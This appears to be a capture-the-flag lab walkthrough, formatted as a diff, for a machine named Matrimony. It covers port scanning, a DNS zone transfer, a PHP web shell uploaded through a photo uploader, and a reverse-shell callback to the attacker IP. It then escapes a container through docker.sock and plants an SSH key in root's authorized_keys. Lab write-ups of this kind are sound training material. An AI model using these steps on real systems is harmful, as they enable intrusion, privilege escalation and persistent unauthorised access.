@@ -1,0 +1,199 @@
+																							                     Matrimony Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.221.196
+export IP=192.168.221.196
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+22/tcp open  ssh
+53/tcp open  domain
+80/tcp open  http
+
+nmap -Pn -n -sC -sV -p22,53,80 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Vanilla Bootstrap v4.2.1 Theme
+Service Info: OS: Linux
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+
+53/udp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
+
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+http-enum: 
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
+|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
+|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
+
+nikto --url $IP -p 80
+
+
+Port 53 - ISC BIND 9.16.1
+
+# Check is the PTR record is set. A PTR record, short for "Pointer" record, is a type of DNS record that maps an IP address to a domain name
+   If we had a public IP, we coud've confirm this with nslookup  (nslookup 8.8.8.8  -- Name:    dns.google), but in our case we need to test this manually.
+   
+dig @$IP -x $IP                                  # -x --shortcurt for reverse lookups
+
+196.221.168.192.in-addr.arpa. 604800 IN PTR     matrimony.off
+
+# So, we see that matrimony.off is the DNS name assigned for our IP. Let’s try to perform Zone Transfer.
+   This command is essentially attempting to transfer the entire DNS zone for the "matrimony.off" domain from the primary DNS server to the computer running the dig command.
+
+dig axfr @$IP matrimony.off
+
+matrimony.off.               604800  IN      SOA     matrimony.off. root.matrimony.off. 4 604800 86400 2419200 604800
+matrimony.off.               604800  IN      NS      matrimony.off.
+matrimony.off.               604800  IN      A       127.0.0.1
+matrimony.off.               604800  IN      AAAA    ::1
+prod99.matrimony.off.    604800  IN      CNAME   matrimony.off.
+matrimony.off.               604800  IN      SOA     matrimony.off. root.matrimony.off. 4 604800 86400 2419200 604800
+
+# Now that we've found another domain, let's add it to /etc/hosts file and assign the same IP address as our target machine.
+
+nano /etc/hosts
+ff02::1                ip6-allnodes
+ff02::2                ip6-allrouters
+192.168.221.196 prod99.matrimony.off
+ 
+# Access http://prod99.matrimony.off 
+
+# Create a new account 
+
+urs
+123456
+
+# Tried different SQL injection but no luck. Let's look for some possible public exploit. If you check on the bottom side of the website we notice Copyright © 2017 Marital . All Rights Reserved | Design by projectworlds
+   Search online for “exploit Marital,  Design by projectworlds”
+   While investigating the epxloit, we see that we can try to upload a profile photo and even if we get an error message, the file still get's uploaded. 
+   
+    go to the page /photouploader.php?id=[ID]
+    upload an arbitrary file in the upload form, in my example, I used a file called shell.php with the content of "<?php system($_GET['cmd']); ?>"
+   An error will occurr, but the file is correctly uploaded at /profile/[ID]/shell.php
+   run command system command through /profile/[ID]/shell.php?cmd=[COMMAND]
+   
+# So, Let's use a shell.php file directly and try to access it directly while having a netcat listener opened.
+
+VERSION = "1.0";
+$ip = '192.168.45.5';  // CHANGE THIS
+$port = 53;       // CHANGE THIS
+
+# Get the netcat listener ready and access the file directly.
+
+http://prod99.matrimony.off/profile/16/shell.php
+
+nc -lvnp 53                                         # Got shell
+
+cat /home/sam/local.txt                   # Flag: e6c1131d4e2190f94f3531a64100610a  
+
+
+Privilege escalation
+
+# Nothing usefull so far.
+# Check for local instances / network configuration
+ifconfig
+docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>
+               inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+               
+# Aparently there is a Docker interface. Let's check the network connections using netstat command.
+
+netstat -ano
+
+tcp        0      0 172.17.0.1:40606        172.17.0.2:22           ESTABLISHED 1546/ssh 
+
+# In the last line, we can see that the host (172.17.0.1) is connected to the docker instance (172.17.0.2). This indicates that we can use SSH in the container.
+   Let's try to login as root into docker. This will use our SSH key.
+   
+ssh -l root 172.17.0.2
+
+# Check when we have root privileges on a container is if we have access to docker.sock.
+   The Docker daemon uses the Unix socket file /var/run/docker.sock to communicate with the Docker client and manage Docker images and containers.
+   If you have root access on a container and have access to the /var/run/docker.sock socket file, you can potentially perform any action on the Docker daemon, such as starting or stopping containers, creating or removing images, and even accessing the host machine's filesystem.
+
+find / -name "docker.sock" 2>/dev/null
+/run/docker.sock
+
+# İmport the Docker binary from the target host to the container. Open another instance of SSH logged in as sam user.
+
+which docker
+/usr/bin/docker
+
+cd /tmp
+cp /usr/bin/docker .
+python3 -m http.server
+
+# Copy the docker binary within the docker instance
+
+wget 192.168.221.196:8000/docker
+chmod +x docker
+
+# Invoke the Docker CLI (Command Line Interface) and telling it to display a list of all Docker images that are stored on the Docker host that is listening on the Unix socket /run/docker.sock.
+
+./docker -H unix:///run/docker.sock images
+
+REPOSITORY      TAG           IMAGE ID            CREATED           SIZE
+<none>          <none>    73aebf20ceb1      11 months ago      223MB
+ubuntu             latest       3f4714ee068a      11 months ago      77.8MB
+
+# If it was a windows host, the commnad would be  docker -H tcp://<hostname-or-IP>:<port> images
+
+# We find that we have 2 different image IDs, we can pick whatever we want. We create a container and mount the /root folder of the target host on our new container.
+
+./docker -H unix:///var/run/docker.sock run -it -v /root:/mnt 7e0aa2d69a15 bash
+
+-H unix:///var/run/docker.sock: This option tells the Docker CLI to use the Docker daemon running on the Unix socket located at /var/run/docker.sock. The Docker daemon is responsible for managing Docker containers and images.
+
+run: This is the command to create and start a new container.
+
+-it: These options tell Docker to run the container in interactive mode with a TTY (terminal) attached.
+
+-v /root:/mnt: This option mounts the /root directory on the host system to the /mnt directory inside the container. This allows files and directories on the host system to be accessed from within the container.
+
+7e0aa2d69a15: This is the ID of the Docker image that the container is based on. Docker images are used to create containers, and they are essentially pre-built file systems that can be used as a base for running applications.
+
+# Check the /mnt folder to verify that we have succsessfully mounted the /root directory to this new container.
+
+cd /mnt
+root@5f671e62ce2f:/mnt# ll
+drwx------ 6 root root 4096 Apr 15 12:19 ./
+drwxr-xr-x 1 root root 4096 Apr 15 12:57 ../
+lrwxrwxrwx 1 root root    9 Apr 28  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
+drwx------ 2 root root 4096 Apr 28  2022 .cache/
+drwxr-xr-x 3 root root 4096 Jan  7  2021 .local/
+-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
+-rw-r--r-- 1 root root   75 Jun  2  2022 .selected_editor
+drwx------ 2 root root 4096 Jun  1  2022 .ssh/
+-rw------- 1 root root  788 Jun  2  2022 .viminfo
+-rw------- 1 root root   33 Apr 15 12:20 proof.txt
+drwxr-xr-x 3 root root 4096 Jan  7  2021 snap/
+
+cat proof.txt                                                         # Flag: 1bfb428a0a2fff2f28aa1caf037794ed
+
+# Now, you can obtain root shell by overwriting the authorized_keys file of the root user of the victims machine with your own keys
+   Let's generate our own ssh key on our own machine
+   
+ssh-keygen
+cd /root/.ssh
+cat id_rsa.pub > authorized_keys
+
+cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0i59c6oKrvka/MVGhCjQ9vMBCSuuBb1+XETLXCXzme3mt4b15xyJGMTEYOfw327w/pXNvVUtXzwsp0Libmj1nRQuIlIgvBfaKsL0xsyF+APaGvVQSoiWRxzX76vsq6Prm+ji/yusNBDJxcxEPV7/wB6pht6llNwhVhthpxclCcSctKd4h1y8bmiAAbb3Io7xu7oGmpusvZkBdctTyxtOI40MiXhgG6Zyf0vl2Oc+g2beq5F1yla3pCJMPxiOmF1m4x3h5AGUfLrwQCkTS72kJjbX5uauWtaGY51gG0bW8wqDAPeoIgeqa2pCu09GC2WIbbB7yCOjDu0BCTk1nzAZD2b6X4gDrfE8EPDQ4+GGSn+IYBiDD4N18hx8OUVxVgL+gp7BIVB1PhEfebQNWwVdCx0gZrOp7x6ETrLNCY2nWDWblJygT4xPnHRtxY5AePiSATYz8R4JhukLYjFpKx/6j0U87xyTJinJJHhvLcm+LCz4tCKp+01yxu2cFgwWy5Y8= root@kali
+
+# Now in the docker container, overwrite the root file
+
+   echo ‘ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzxiEiqfchpyODS6p5qs/CDfd4xcHm3lT0BCupbF9FjlgESS4omb9NP5EZXmmudSLGZtkPNvQN8yj1YYWVFu2/QF18kE80fD+2M0QVcRmvuj18PckJozVfFmhYed7O/TU1qHt4uszmMnCqFkERg42EjRx2WLtSzF12E8trUpsXUVL4tA5LuQEnrcOYgOe7QdH/yqSSB6jwvmI++gj7i08yZouengjGrqmS6FoVih+ki35foGHB3mQN72kCPqDo9NWEt0zV77bN9W+LoFh4Z2a2PR1uTEkTzixsdxyzaH/K8Gl5qTR0rd2fXUC7flpWe2X19xg9pvy86WH7b9tXDWCvPpuovXHLgYCCe4MYj/v0JWU5q0gY9JirTml8fJwzccIPdvt0qZihEpWdpVVqgDn7UKlS/++y4jN7lkz2gFY7AxVU8KvbA7BdP/DtMQhd5SYtGm941uPPmPvv7w6z4XxljMuMc4YKFzCh2jh6+aSofb41rzIdx/aVxgkDghTrXJ0= kali@kali’ > /mnt/.ssh/authorized_keys
+   
+# Switch back to your local machine and connect to our target using ssh
+
+ssh -i id_rsa root@$IP
+
+root@matrimony:~# id
+uid=0(root) gid=0(root) groups=0(root)
